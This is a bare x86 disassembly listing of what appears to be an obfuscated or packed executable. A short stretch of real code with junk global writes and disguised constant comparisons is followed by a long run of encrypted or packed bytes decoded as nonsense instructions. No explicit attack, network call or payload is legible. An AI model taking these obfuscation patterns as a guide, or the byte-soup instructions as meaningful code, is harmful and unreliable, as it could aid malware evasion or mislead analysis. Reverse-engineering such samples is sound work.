  402a7b:	add    DWORD PTR ds:0x42d008,esi
  402a81:	xor    ecx,edx
  402a83:	add    esi,DWORD PTR ds:0x429018
  402a89:	mov    esi,0x3272dd
  402a8e:	sub    DWORD PTR ds:0x42d004,0x41ed
  402a98:	push   edi
  402a99:	mov    edi,DWORD PTR [ebp+0x10]
  402a9c:	add    ecx,esi
  402a9e:	mov    DWORD PTR ds:0x42c014,0x852
  402aa8:	cmp    ecx,edi
  402aaa:	mov    DWORD PTR ds:0x42b014,0x2a3e
  402ab4:	je     0x404f9d
  402aba:	inc    ecx
  402abb:	mov    ecx,DWORD PTR [ebp-0x4]
  402abe:	and    DWORD PTR ds:0x42a010,0x0
  402ac8:	mov    edi,DWORD PTR ds:0x42a010
  402ace:	inc    edi
  402acf:	mov    DWORD PTR ds:0x42a010,edi
  402ad5:	cmp    DWORD PTR ds:0x42a010,0x2a
  402adc:	jne    0x402ae8
  402ae2:	call   DWORD PTR ds:0x42ed71
  402ae8:	cmp    DWORD PTR ds:0x42a010,0x1b
  402aef:	jb     0x402ac8
  402af5:	mov    edi,DWORD PTR ds:0x42c00c
  402afb:	sbb    DWORD PTR ds:0x42a01c,edi
  402b01:	mov    edi,DWORD PTR [ebp+0x10]
  402b04:	xor    DWORD PTR ds:0x429010,0x457d
  402b0e:	xor    eax,eax
  402b10:	xor    DWORD PTR ds:0x42c010,0x42b010
  402b1a:	xor    ecx,edx
  402b1c:	add    DWORD PTR ds:0x429028,0x1d9a
  402b26:	add    ecx,esi
  402b28:	add    edi,0xfabdbeed
  402b2e:	mov    DWORD PTR ds:0x42d014,0x7361
  402b38:	adc    eax,0xffffffff
  402b3b:	xor    eax,0x0
  402b3e:	mov    DWORD PTR [ebp-0xc],eax
  402b41:	push   ebx
  402b42:	xor    ebx,ebx
  402b44:	xor    edi,0x8a29a127
  402b4a:	mov    eax,ecx
  402b4c:	add    eax,0xfabdbeed
  402b51:	adc    ebx,0xffffffff
  402b54:	xor    eax,0x8a29a127
  402b59:	xor    ebx,0x0
  402b5c:	cmp    eax,edi
  402b5e:	jne    0x404f2f
  402b64:	cmp    ebx,DWORD PTR [ebp-0xc]
  402b67:	je     0x404f97
  402b6d:	jmp    0x404f2f
  402b72:	mov    esi,0x3272dd
  402b77:	jmp    0x404f2f
  402b7c:	jmp    0x402b15
  402b7e:	iret   
  402b7f:	push   esi
  402b80:	jae    0x402b78
  402b82:	retf   
  402b83:	xchg   edi,eax
  402b84:	mov    al,ds:0x2a55e01a
  402b89:	xlat   BYTE PTR ds:[ebx]
  402b8a:	pushf  
  402b8b:	aam    0x7a
  402b8d:	jp     0x402c09
  402b8f:	jp     0x402b68
  402b91:	pop    edi
  402b92:	jp     0x402c0e
  402b94:	adc    eax,0x1921172c
  402b99:	and    eax,0x3c652f1b
  402b9e:	imul   esp,DWORD PTR [esi-0x18],0x6d6a6a67
  402ba5:	xor    al,ch
  402ba7:	fsubr  st(1),st
  402ba9:	push   eax
  402baa:	dec    eax
  402bab:	imul   esp,DWORD PTR [ecx+0x5b],0xffffff90
  402baf:	pusha  
  402bb0:	ins    DWORD PTR es:[edi],dx
  402bb1:	pop    ecx
  402bb2:	iret   
  402bb3:	pop    ebp
  402bb4:	dec    edx
  402bb5:	and    BYTE PTR [edx+edi*8+0x4d577687],cl
  402bbc:	jg     0x402bf5
  402bbe:	jo     0x402b66
  402bc0:	jg     0x402b62
  402bc2:	mov    ds:0x66ff2c3b,al
  402bc7:	fdiv   st(2),st
  402bc9:	push   ebx
  402bca:	jg     0x402bea
  402bcc:	in     eax,dx
  402bcd:	cmp    ebp,ecx
  402bcf:	mov    edx,0xde1387ed
  402bd4:	mov    ebp,DWORD PTR [ecx]
  402bd6:	mulps  xmm5,XMMWORD PTR [ebx+0x6df7c48a]
  402bdd:	fld    QWORD PTR [esp+edx*8]
  402be0:	push   cs
  402be1:	cli    
  402be2:	sbb    BYTE PTR es:[eax+0xc],cl
  402be6:	imul   ebp,DWORD PTR es:[eax-0x47],0xffffffaf
  402beb:	adc    eax,DWORD PTR [ecx+0x5]
  402bee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402bef:	(bad)  
  402bf0:	jmp    0x32b4573e
  402bf5:	enter  0xf95b,0x1a
  402bf9:	cli    
  402bfa:	js     0x402b9d
  402bfc:	arpl   bp,bx
  402bfe:	cwde   
  402bff:	pop    edi
  402c00:	mov    esp,DWORD PTR [ecx+0x31821407]
  402c06:	repz sahf 
  402c08:	cmp    al,0x72
  402c0a:	jae    0x402c17
  402c0c:	fisubr DWORD PTR ds:0x33348d52
  402c12:	push   esp
  402c13:	jecxz  0x402be4
  402c15:	mov    ch,BYTE PTR [ecx]
  402c17:	mov    DWORD PTR [eax+0x5188ccb7],esi
  402c1d:	in     al,0x45
  402c1f:	push   edx
  402c20:	dec    esp
  402c21:	or     al,0x3e
  402c23:	repz add ebp,DWORD PTR ss:[ebp+0x30a7ca4b]
  402c2b:	rol    BYTE PTR [esi+edx*2],0xfd
  402c2f:	push   edx
  402c30:	push   esi
  402c31:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402c32:	stc    
  402c33:	push   0x242f8bf
  402c38:	lods   eax,DWORD PTR ds:[esi]
  402c39:	div    dh
  402c3b:	out    dx,eax
  402c3c:	mov    dh,0x2c
  402c3e:	dec    ebx
  402c3f:	loope  0x402c71
  402c41:	in     al,dx
  402c42:	ds xchg ebp,eax
  402c44:	je     0x402cbf
  402c46:	jo     0x402bd0
  402c48:	mov    ds:0xa1b65afd,al
  402c4d:	test   BYTE PTR [edi],ch
  402c4f:	and    edi,esi
  402c51:	or     ch,dh
  402c53:	dec    ebx
  402c54:	test   edi,0xf00d9558
  402c5a:	inc    ebp
  402c5b:	adc    eax,0x131d72ee
  402c60:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402c61:	pop    esi
  402c62:	cmp    al,0x63
  402c64:	cmp    edi,edx
  402c66:	stos   BYTE PTR es:[edi],al
  402c67:	ror    DWORD PTR [ebp+eiz*8-0x1],cl
  402c6b:	hlt    
  402c6c:	xchg   edi,eax
  402c6d:	cmp    BYTE PTR [ecx+0x36],0xe4
  402c71:	inc    ebx
  402c72:	or     al,0xa
  402c74:	cmp    al,0x43
  402c76:	sbb    BYTE PTR [edi-0x2620e425],cl
  402c7c:	xor    edi,edi
  402c7e:	mov    ecx,DWORD PTR [esi+0xe990fe6]
  402c84:	pop    edi
  402c85:	div    BYTE PTR [ecx+0x4634c411]
  402c8b:	mov    ecx,0x58e4de98
  402c90:	fbld   TBYTE PTR [eax*2+0x17281f3d]
  402c97:	jno    0x402cde
  402c99:	out    0xe2,al
  402c9b:	mov    edx,0xa963795c
  402ca0:	cmp    cl,BYTE PTR [edx-0x35]
  402ca3:	cs jecxz 0x402c77
  402ca6:	inc    ebx
  402ca7:	in     al,0xed
  402ca9:	mov    DWORD PTR [ebp-0x222fb587],ecx
  402caf:	sub    bh,BYTE PTR [ecx+0x16]
  402cb2:	popa   
  402cb3:	and    al,0xa
  402cb5:	push   ebx
  402cb6:	iret   
  402cb7:	gs xchg ecx,eax
  402cb9:	inc    edi
  402cba:	rol    DWORD PTR [eax-0x293c78b7],cl
  402cc0:	and    BYTE PTR [edx+0x67],bh
  402cc3:	xor    eax,0x9566eff3
  402cc8:	mov    dh,0x50
  402cca:	add    DWORD PTR [ebp-0x5f],ebp
  402ccd:	or     ch,BYTE PTR [esi+0x60]
  402cd0:	leave  
  402cd1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402cd2:	sbb    BYTE PTR [ebx],al
  402cd4:	frstor [ebp-0x20]
  402cd7:	(bad)
  402cda:	jbe    0x402d54
  402cdc:	mov    ebp,0x6660c216
  402ce1:	add    ebx,eax
  402ce3:	in     al,0xc8
  402ce5:	mov    bl,0x8e
  402ce7:	adc    bh,bl
  402ce9:	je     0x402d57
  402ceb:	push   ds
  402cec:	push   esp
  402ced:	jg     0x402cfb
  402cef:	xchg   esi,eax
  402cf0:	bound  ebx,QWORD PTR [edi]
  402cf2:	pop    es
  402cf3:	cdq    
  402cf4:	dec    ebp
  402cf5:	enter  0x22b1,0x44
  402cf9:	popa   
  402cfa:	ret    0x8af8
  402cfd:	sbb    dx,WORD PTR [ecx+0x60846db3]
  402d04:	ja     0x402ceb
  402d06:	adc    BYTE PTR [edi+edx*2],cl
  402d09:	sar    esi,cl
  402d0b:	jmp    0x402d25
  402d0d:	mov    bh,0x84
  402d0f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402d10:	cmp    al,0x62
  402d12:	das    
  402d13:	or     al,0x3b
  402d15:	pop    esi
  402d16:	push   ebx
  402d17:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402d18:	stc    
  402d19:	dec    esp
  402d1a:	fiadd  DWORD PTR [ecx]
  402d1c:	jg     0x402cbe
  402d1e:	leave  
  402d1f:	mov    bl,0x93
  402d21:	in     eax,dx
  402d22:	icebp  
  402d23:	mov    dl,0x25
  402d25:	arpl   WORD PTR [edi+0x1d6bb64d],di
  402d2b:	shl    BYTE PTR [edx],cl
  402d2d:	mov    ah,0x16
  402d2f:	pop    edx
  402d30:	pusha  
  402d31:	lock adc eax,DWORD PTR [esi+0x2b]
  402d35:	test   ebp,esp
  402d37:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402d38:	int    0x34
  402d3a:	scas   al,BYTE PTR es:[edi]
  402d3b:	retf   0x7b3b
  402d3e:	push   0xa8b1bdf7
  402d43:	fadd   st(2),st
  402d45:	fcmove st,st(3)
  402d47:	leave  
  402d48:	std    
  402d49:	pop    esp
  402d4a:	inc    edx
  402d4b:	sbb    BYTE PTR [esi+0x7fe44551],bl
  402d51:	xor    edx,ecx
  402d53:	pop    es
  402d54:	push   0xe6d38180
  402d59:	sbb    ebx,DWORD PTR [ebx+0x68e9a664]
  402d5f:	into   
  402d60:	lds    eax,FWORD PTR [ebx+0x4b]
  402d63:	pop    ss
  402d64:	outs   dx,BYTE PTR ds:[esi]
  402d65:	test   DWORD PTR [edi+0x35],0x146624f1
  402d6c:	mov    ebx,DWORD PTR [eax+0x1b68a630]
  402d72:	je     0x402cfb
  402d74:	mov    esp,0xe12a8ce3
  402d79:	into   
  402d7a:	push   esi
  402d7b:	test   eax,0x896385af
  402d80:	xchg   edi,eax
  402d81:	cs leave 
  402d83:	add    DWORD PTR [eax-0x7d50c8a4],0xc56c9513
  402d8d:	pop    es
  402d8e:	cmp    BYTE PTR [esi],0xef
  402d91:	sar    BYTE PTR [edi+0x7c],0x5c
  402d95:	sbb    ecx,DWORD PTR [edi-0x7b]
  402d98:	sbb    al,0x28
  402d9a:	retf   
  402d9b:	push   ebx
  402d9c:	lahf   
  402d9d:	addr16 dec ebx
  402d9f:	mov    eax,0xc7f1610e
  402da4:	test   al,0x75
  402da6:	jmp    0x402d72
  402da8:	inc    eax
  402da9:	sub    BYTE PTR [ecx-0x2fb553ed],ch
  402daf:	mov    bl,al
  402db1:	fs or  eax,0x3875d768
  402db7:	fst    DWORD PTR [edi-0x1733a88b]
  402dbd:	(bad)  
  402dbf:	and    al,0x8f
  402dc1:	mov    ds:0xc43d3cec,eax
  402dc6:	sahf   
  402dc7:	rol    bh,1
  402dc9:	inc    esi
  402dca:	stc    
  402dcb:	ins    BYTE PTR es:[edi],dx
  402dcc:	rol    DWORD PTR ss:[ecx+0x60956e3],cl
  402dd3:	pop    esp
  402dd4:	call   0x973f685
  402dd9:	loope  0x402e00
  402ddb:	and    dl,0x3
  402dde:	sahf   
  402ddf:	pop    esi
  402de0:	mul    DWORD PTR [ecx-0x2]
  402de3:	out    dx,al
  402de4:	aam    0x6d
  402de6:	scas   eax,DWORD PTR es:[edi]
  402de7:	sbb    ebp,DWORD PTR ds:0xf5b62604
  402ded:	cmc    
  402dee:	pop    ecx
  402def:	xchg   ebx,eax
  402df0:	sub    BYTE PTR [ebx],ch
  402df2:	inc    ebx
  402df3:	jmp    0x9499:0xce132519
  402dfa:	in     al,0xef
  402dfc:	add    ah,BYTE PTR [ebp+0x75]
  402dff:	stc    
  402e00:	add    DWORD PTR [edi+0x45],eax
  402e03:	in     al,0xf
  402e05:	pop    eax
  402e06:	xor    ebx,DWORD PTR [edx+ebx*1+0x34]
  402e0a:	stc    
  402e0b:	pop    edi
  402e0c:	and    eax,0xcedbf07b
  402e11:	pusha  
  402e12:	test   al,0xf9
  402e14:	adc    BYTE PTR [edx+0x7],bl
  402e17:	iret   
  402e18:	mov    dh,0x1c
  402e1a:	mov    ah,0xc9
  402e1c:	pushf  
  402e1d:	ss mov eax,db1
  402e21:	bound  edx,QWORD PTR [edi+0x27]
  402e24:	mov    esp,0xb00f5089
  402e29:	push   esp
  402e2a:	fsubr  st,st(1)
  402e2c:	fs jae 0x402e19
  402e2f:	adc    al,ah
  402e31:	mov    eax,0x7e6f7255
  402e36:	scas   al,BYTE PTR es:[edi]
  402e37:	(bad)  
  402e38:	leave  
  402e39:	push   esp
  402e3a:	pmaxub mm1,QWORD PTR ds:0xca1fcbfa
  402e41:	shl    ebx,cl
  402e43:	mov    eax,ds:0x48b8eb0a
  402e48:	outs   dx,BYTE PTR ds:[esi]
  402e49:	aam    0xba
  402e4b:	and    ch,BYTE PTR [ebp-0x48]
  402e4e:	int    0xa9
  402e50:	call   0x1731:0x633a9147
  402e57:	outs   dx,BYTE PTR ds:[esi]
  402e58:	ins    DWORD PTR es:[edi],dx
  402e59:	adc    ecx,DWORD PTR [eax+0x681b85ed]
  402e5f:	push   edx
  402e60:	dec    BYTE PTR [ebx-0x294f9960]
  402e66:	lds    ebp,FWORD PTR [eax-0x26]
  402e69:	(bad)  
  402e6a:	fadd   DWORD PTR [ecx+0x63]
  402e6d:	fwait
  402e6e:	out    0x35,eax
  402e70:	repnz mov al,ds:0x16d0fa27
  402e76:	stos   BYTE PTR es:[edi],al
  402e77:	push   ss
  402e78:	jbe    0x402e8e
  402e7a:	pop    esi
  402e7b:	jns    0x402e9f
  402e7d:	push   es
  402e7e:	and    eax,0xd94e2e50
  402e83:	xchg   ebp,eax
  402e84:	xlat   BYTE PTR ds:[ebx]
  402e85:	xchg   BYTE PTR [eax-0x4ebbc93c],ah
  402e8b:	or     eax,0xbc074816
  402e90:	or     DWORD PTR [esi-0x2d742f],0xfffffff8
  402e97:	fwait
  402e98:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402e99:	sbb    eax,0x18cf2e79
  402e9e:	mov    ah,0x6b
  402ea0:	ret    0x1869
  402ea3:	or     dl,BYTE PTR ds:0x7754fab1
  402ea9:	addr16 retf 
  402eab:	push   0xa6d98c3a
  402eb0:	lock xchg DWORD PTR gs:[eax-0x61b0dacb],edx
  402eb8:	add    BYTE PTR [edx-0x2e],0xd0
  402ebc:	aaa    
  402ebd:	dec    ebx
  402ebe:	or     DWORD PTR [eax+ebp*2+0x7ab23cc6],eax
  402ec5:	cs push ecx
  402ec7:	stos   BYTE PTR es:[di],al
  402ec9:	shl    DWORD PTR [edx+0x743a569d],1
  402ecf:	jmp    0xca88:0xccb33ad8
  402ed6:	jge    0x402f40
  402ed8:	push   0xc5fc298d
  402edd:	or     eax,0xb016943a
  402ee2:	mov    eax,ds:0xb6e39e29
  402ee7:	sahf   
  402ee8:	dec    ebp
  402ee9:	sbb    eax,0x1397ee9d
  402eee:	inc    ecx
  402eef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402ef0:	mov    DWORD PTR [edi],esi
  402ef2:	into   
  402ef3:	daa    
  402ef4:	jp     0x402eec
  402ef6:	sbb    BYTE PTR cs:[edx],al
  402ef9:	daa    
  402efa:	xchg   ebx,eax
  402efb:	mov    bl,0x42
  402efd:	idiv   DWORD PTR [edx+0x4fddd2ef]
  402f03:	aaa    
  402f04:	sub    DWORD PTR [esi-0x75dbdcf8],ecx
  402f0a:	adc    BYTE PTR [edi-0x29],bh
  402f0d:	repz ficom DWORD PTR [edi-0x4d05f06b]
  402f14:	dec    edi
  402f15:	imul   ebp,DWORD PTR [edi],0x7b
  402f18:	mov    esp,0x1a0db748
  402f1d:	aad    0x82
  402f1f:	sub    bl,bl
  402f21:	jp     0x402f68
  402f23:	or     DWORD PTR [ebx],ebx
  402f25:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402f26:	ds jp  0x402f8a
  402f29:	dec    ebx
  402f2a:	mov    bl,0x9c
  402f2c:	je     0x402f74
  402f2e:	sub    dh,ah
  402f30:	fistp  WORD PTR [ebx+0x6376f858]
  402f36:	inc    ebp
  402f37:	mov    edx,0x61b2b0c1
  402f3c:	xchg   ebx,eax
  402f3d:	inc    edi
  402f3e:	shl    BYTE PTR [ebx],cl
  402f40:	loopne 0x402f07
  402f42:	idiv   BYTE PTR [edi+esi*2+0x5c607d96]
  402f49:	call   0x736e:0x47419649
  402f50:	add    eax,0x7b0c16bf
  402f55:	and    DWORD PTR [edi-0x39],0x8d0ba507
  402f5c:	add    eax,0xe662af85
  402f61:	push   ss
  402f62:	push   esi
  402f63:	or     edi,ebp
  402f65:	lods   al,BYTE PTR ds:[esi]
  402f66:	pop    edi
  402f67:	(bad)  
  402f68:	sub    al,0x39
  402f6a:	lods   al,BYTE PTR ds:[esi]
  402f6b:	jb     0x402f50
  402f6d:	(bad)  
  402f6e:	popa   
  402f6f:	out    dx,al
  402f70:	jns    0x402fa0
  402f72:	push   ebx
  402f73:	enter  0x3770,0x6c
  402f77:	fisub  WORD PTR [eax]
  402f79:	imul   ebp,edx,0x62
  402f7c:	dec    ebx
  402f7d:	push   esi
  402f7e:	push   edi
  402f7f:	cmc    
  402f80:	cmp    eax,0xf69317b7
  402f85:	mov    ebx,0xfbbf6085
  402f8a:	cmp    BYTE PTR [ecx],dl
  402f8c:	xchg   esi,eax
  402f8d:	pop    ecx
  402f8e:	xchg   ecx,eax
  402f8f:	mov    eax,ds:0xd9eb6da7
  402f94:	add    eax,0x9f01a12d
  402f99:	mov    esi,0x8fba0bb1
  402f9e:	xlat   BYTE PTR ds:[ebx]
  402f9f:	neg    DWORD PTR gs:[ebx+0x56ceed45]
  402fa6:	enter  0xb145,0xb0
  402faa:	lods   al,BYTE PTR ds:[esi]
  402fab:	mov    esi,0x49293a83
  402fb0:	jmp    0xd002:0x8b5012a7
  402fb7:	push   edi
  402fb8:	stos   DWORD PTR es:[edi],eax
  402fb9:	aad    0xb8
  402fbb:	aam    0x9b
  402fbd:	pop    ebp
  402fbe:	fimul  WORD PTR [ebx]
  402fc0:	adc    dh,BYTE PTR [ecx+0x27]
  402fc3:	pusha  
  402fc4:	xor    esp,DWORD PTR [edi]
  402fc6:	pop    ss
  402fc7:	inc    ecx
  402fc8:	pop    ss
  402fc9:	pop    edi
  402fca:	dec    ecx
  402fcb:	clc    
  402fcc:	pop    ss
  402fcd:	and    ecx,esi
  402fcf:	push   eax
  402fd0:	fild   QWORD PTR [ebp+0x33]
  402fd3:	mov    ebx,0xfa5f667d
  402fd8:	jae    0x402ffc
  402fda:	jns    0x402fcd
  402fdc:	xor    BYTE PTR gs:[ebp-0xa3e1e87],dh
  402fe3:	(bad)  
  402fe4:	and    DWORD PTR [edi],edx
  402fe6:	mov    ecx,0x4d41cb47
  402feb:	imul   DWORD PTR ds:0x216b1dad
  402ff1:	scas   eax,DWORD PTR es:[edi]
  402ff2:	bnd jg 0x40304c
  402ff5:	or     ebp,DWORD PTR [edx]
  402ff7:	lods   al,BYTE PTR ds:[esi]
  402ff8:	push   ss
  402ff9:	adc    edi,DWORD PTR [ebx]
  402ffb:	je     0x402f9c
  402ffd:	jnp    0x402fb7
  402fff:	dec    ecx
  403000:	adc    al,0x52
  403002:	push   ss
  403003:	add    ch,bh
  403005:	jmp    0xef84:0x5a361c15
  40300c:	push   ds
  40300d:	push   esp
  40300e:	jnp    0x402f9b
  403010:	mov    ah,BYTE PTR [esi-0x3305322a]
  403016:	lahf   
  403017:	not    DWORD PTR [esi+0x1a]
  40301a:	loop   0x402ffc
  40301c:	je     0x403047
  40301e:	and    dl,BYTE PTR [esi-0x656b5acf]
  403024:	sub    bh,ah
  403026:	std    
  403027:	or     DWORD PTR [edx],ebx
  403029:	mov    ecx,0xa2edc49f
  40302e:	push   0xc7e9bcc5
  403033:	(bad)  
  403034:	push   ds
  403035:	jae    0x402ffa
  403037:	sub    al,BYTE PTR [edx+0x55]
  40303a:	pop    esi
  40303b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40303c:	call   0x9ed02535
  403041:	jge    0x403031
  403043:	jmp    DWORD PTR [ecx]
  403045:	shr    BYTE PTR [ecx+eax*2-0x5d],1
  403049:	fst    QWORD PTR [eax+0x37]
  40304c:	mov    eax,0xc8907d69
  403051:	int3   
  403052:	push   eax
  403053:	fs addr16 mov dh,0x3
  403057:	mov    dh,0x11
  403059:	sub    ecx,DWORD PTR [esi+ebx*1-0x10]
  40305d:	outs   dx,DWORD PTR ds:[esi]
  40305e:	add    al,0x40
  403060:	test   BYTE PTR [eax-0x5e],dl
  403063:	sub    ch,BYTE PTR [eax+0x27430d50]
  403069:	lds    edi,FWORD PTR [edi-0x71bdd762]
  40306f:	jl     0x40308f
  403071:	or     ah,BYTE PTR [ecx]
  403073:	popf   
  403074:	arpl   WORD PTR ds:0xedc20a47,dx
  40307a:	inc    esi
  40307b:	cmp    ebx,DWORD PTR [edx-0x26]
  40307e:	aas    
  40307f:	inc    ebp
  403080:	je     0x40302f
  403082:	pop    ds
  403083:	xor    edi,DWORD PTR ds:0x9d3ffc93
  403089:	jmp    0x40308a
  40308b:	mov    ch,BYTE PTR [edx-0x14f86e81]
  403091:	cwde   
  403092:	iret   
  403093:	cs dec ebx
  403095:	imul   edi,ebp,0x3a5f4a08
  40309b:	fisubr DWORD PTR [ebx-0x46]
  40309e:	and    BYTE PTR [esi],bl
  4030a0:	in     al,0xcb
  4030a2:	push   0x59
  4030a4:	mov    ebp,0xa9b646f
  4030a9:	xor    ch,ch
  4030ab:	fist   DWORD PTR [edi]
  4030ad:	ins    BYTE PTR es:[edi],dx
  4030ae:	loop   0x403069
  4030b0:	out    0x1f,al
  4030b2:	fucomp st(3)
  4030b4:	dec    esi
  4030b5:	popf   
  4030b6:	cdq    
  4030b7:	jecxz  0x4030f7
  4030b9:	xchg   BYTE PTR [esi+0x1a],dl
  4030bc:	stc    
  4030bd:	imul   esp,DWORD PTR [ecx+0x7dd6eefa],0x4f6baac3
  4030c7:	xor    ecx,DWORD PTR [ebp+0x5c]
  4030ca:	pop    ds
  4030cb:	cmp    eax,edx
  4030cd:	and    bh,bh
  4030cf:	dec    eax
  4030d0:	mov    dl,0x8c
  4030d2:	mov    dl,0x93
  4030d4:	call   0x38d5e57c
  4030d9:	or     eax,ebx
  4030db:	mov    ds:0xa6038676,al
  4030e0:	test   eax,0xdad57a32
  4030e5:	ins    BYTE PTR es:[edi],dx
  4030e6:	pop    edi
  4030e7:	rol    DWORD PTR ds:0xc5c962a8,1
  4030ed:	bound  esp,QWORD PTR [ecx+0x61]
  4030f0:	mov    ebx,0xa11f04d3
  4030f5:	mov    dh,0xb4
  4030f7:	cmc    
  4030f8:	sahf   
  4030f9:	cmp    BYTE PTR [ecx+0x31285425],cl
  4030ff:	ror    BYTE PTR ds:0x36417c69,1
  403105:	pop    ebx
  403106:	mov    al,ds:0xd477eb9f
  40310b:	js     0x4030c4
  40310d:	add    eax,0xce900a84
  403112:	retf   0x8859
  403115:	dec    ecx
  403116:	cs das 
  403118:	mov    ds:0xa78b761c,eax
  40311d:	sub    eax,0x851d012b
  403122:	ret    0xf452
  403125:	mov    ds:0x8d10a491,eax
  40312a:	xor    ebp,0x42d6b825
  403130:	pusha  
  403131:	jno    0x4030e3
  403133:	scas   eax,DWORD PTR es:[edi]
  403134:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403135:	pop    ecx
  403136:	jle    0x4031b5
  403138:	shr    BYTE PTR ds:0x584ff6a6,0x6b
  40313f:	inc    eax
  403140:	dec    edx
  403141:	popf   
  403142:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403143:	enter  0xe868,0x52
  403147:	call   FWORD PTR ds:0xf057b227
  40314d:	push   eax
  40314e:	mov    cl,0x88
  403150:	retf   
  403151:	jnp    0x40314a
  403153:	add    ebx,DWORD PTR [ebx+0x3dd2a8e9]
  403159:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40315a:	aam    0xdb
  40315c:	lods   al,BYTE PTR ds:[esi]
  40315d:	scas   eax,DWORD PTR es:[edi]
  40315e:	dec    esp
  40315f:	ja     0x40313d
  403161:	mov    dl,0xb2
  403163:	imul   ecx,ebp,0xe
  403166:	sbb    eax,esp
  403168:	arpl   WORD PTR [edx+eiz*1-0x25bc9f44],dx
  40316f:	cmp    bh,ch
  403171:	push   esp
  403172:	jle    0x403175
  403174:	fwait
  403175:	iret   
  403176:	xchg   edi,eax
  403177:	jnp    0x4031bc
  403179:	test   eax,0x940fbfd7
  40317e:	loop   0x40317c
  403180:	loope  0x4031dc
  403182:	adc    al,0x68
  403184:	xlat   BYTE PTR ds:[ebx]
  403185:	fsub   QWORD PTR [ebp+ebx*8-0x75]
  403189:	shl    DWORD PTR [edi+0x23124018],cl
  40318f:	retf   
  403190:	cs push eax
  403192:	rcl    DWORD PTR [edi+0x4f],1
  403195:	mov    ebp,0x57dd303c
  40319a:	add    edx,ebp
  40319c:	or     esi,DWORD PTR [esi]
  40319e:	xchg   edx,eax
  40319f:	xchg   ebx,eax
  4031a0:	inc    esi
  4031a1:	not    ebp
  4031a3:	in     al,dx
  4031a4:	cmp    al,0xd0
  4031a6:	xchg   DWORD PTR [ebp-0x79],eax
  4031a9:	dec    esi
  4031aa:	in     al,dx
  4031ab:	inc    esi
  4031ac:	les    ecx,FWORD PTR [edi+edi*1]
  4031af:	in     al,0x23
  4031b1:	in     al,0xc3
  4031b3:	enter  0xc302,0xf
  4031b7:	adc    esp,DWORD PTR ds:0xae2cd304
  4031bd:	push   es
  4031be:	sub    al,0x10
  4031c0:	mov    edi,edx
  4031c2:	enter  0x5fa2,0x11
  4031c6:	xchg   ebp,eax
  4031c7:	xor    al,0x28
  4031c9:	in     al,dx
  4031ca:	sub    eax,0xe2d4ea32
  4031cf:	int3   
  4031d0:	out    dx,al
  4031d1:	out    dx,eax
  4031d2:	mov    eax,ds:0x777ce9ae
  4031d7:	mov    DWORD PTR [eax+ecx*2],esi
  4031da:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4031db:	jno    0x4031df
  4031dd:	sahf   
  4031de:	jb     0x4031b6
  4031e0:	xchg   esi,eax
  4031e1:	or     ebp,ecx
  4031e3:	loop   0x4031fc
  4031e5:	add    al,0x92
  4031e7:	mov    ds:0x1c0cb56b,eax
  4031ec:	(bad)  
  4031ee:	cdq    
  4031ef:	arpl   WORD PTR [ecx],di
  4031f1:	mov    eax,0x557d844
  4031f6:	mov    ds:0x5a55f8da,eax
  4031fb:	pop    ebp
  4031fc:	jno    0x403216
  4031fe:	pop    ebx
  4031ff:	in     eax,dx
  403200:	xchg   ecx,eax
  403201:	inc    esp
  403202:	into   
  403203:	jp     0x403245
  403205:	jle    0x4031be
  403207:	add    bh,al
  403209:	rcl    DWORD PTR [ecx-0x49],cl
  40320c:	jle    0x4031b2
  40320e:	xor    eax,0x97f5c6bb
  403213:	aad    0x89
  403215:	xchg   esi,eax
  403216:	sti    
  403217:	inc    ebx
  403218:	or     eax,edi
  40321a:	outs   dx,DWORD PTR gs:[esi]
  40321c:	iret   
  40321d:	and    ah,al
  40321f:	out    0x11,eax
  403221:	in     eax,0x83
  403223:	inc    edx
  403224:	mov    eax,DWORD PTR [esp+esi*4]
  403227:	cmp    BYTE PTR [edx-0x23],0x6c
  40322b:	push   0x445a571d
  403230:	loop   0x403218
  403232:	lahf   
  403233:	xchg   esi,eax
  403234:	pop    ds
  403235:	pop    ebp
  403236:	sbb    esi,DWORD PTR [esi+0x2]
  403239:	into   
  40323a:	or     edi,ecx
  40323c:	xchg   edx,eax
  40323d:	inc    ecx
  40323e:	add    eax,DWORD PTR [edi]
  403240:	fidivr WORD PTR [edi+0x4d01749c]
  403246:	or     BYTE PTR [ecx-0xa],bh
  403249:	and    ch,0xc3
  40324c:	popa   
  40324d:	iret   
  40324e:	mov    al,0x59
  403250:	cmp    ah,BYTE PTR ds:0x5ba6963d
  403256:	adc    bl,BYTE PTR [esi-0x20]
  403259:	lea    eax,[edi+0x6a]
  40325c:	jg     0x4032cf
  40325e:	(bad)  
  40325f:	mov    esp,0xd824103e
  403264:	sub    dl,BYTE PTR [ebp+0x7f]
  403267:	loopne 0x4032a4
  403269:	icebp  
  40326a:	sbb    dh,BYTE PTR [edx+0x31066adc]
  403270:	dec    ebp
  403271:	push   es
  403272:	xor    BYTE PTR [edx],ah
  403274:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403275:	sbb    edx,DWORD PTR ds:0x8185188c
  40327b:	pop    esi
  40327c:	sub    eax,0x3facea89
  403281:	push   ebx
  403282:	fwait
  403283:	or     ecx,eax
  403285:	call   0x8f02a0a
  40328a:	mov    DWORD PTR [eax-0x14],edi
  40328d:	inc    ebp
  40328e:	xor    bl,cl
  403290:	out    dx,eax
  403291:	mov    ecx,0x99a7a713
  403296:	inc    ebp
  403297:	push   esi
  403298:	or     ebx,DWORD PTR [edx-0x2e2ae496]
  40329e:	cmc    
  40329f:	mov    ch,0x29
  4032a1:	ja     0x403277
  4032a3:	fs ds mov ebx,0xe20234e2
  4032aa:	add    eax,0xa6f68352
  4032af:	cs push edx
  4032b1:	jl     0x40330e
  4032b3:	fsubr  st,st(7)
